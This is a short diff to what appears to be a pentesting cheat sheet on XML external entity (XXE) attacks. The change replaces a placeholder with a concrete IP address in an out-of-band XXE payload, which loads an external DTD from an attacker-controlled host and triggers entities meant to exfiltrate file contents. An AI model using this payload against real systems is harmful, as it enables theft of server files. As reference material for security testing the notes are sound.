@@ -176,7 +176,7 @@ Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuz
 ```xml
 <?xml version="1.0" encoding="utf-8"?> 
 <!DOCTYPE oob [
-<!ENTITY % base SYSTEM "http://your ip address/external.dtd"> 
+<!ENTITY % base SYSTEM "http://192.168.88.131/external.dtd"> 
 %base;
 %external;
 %exfil;
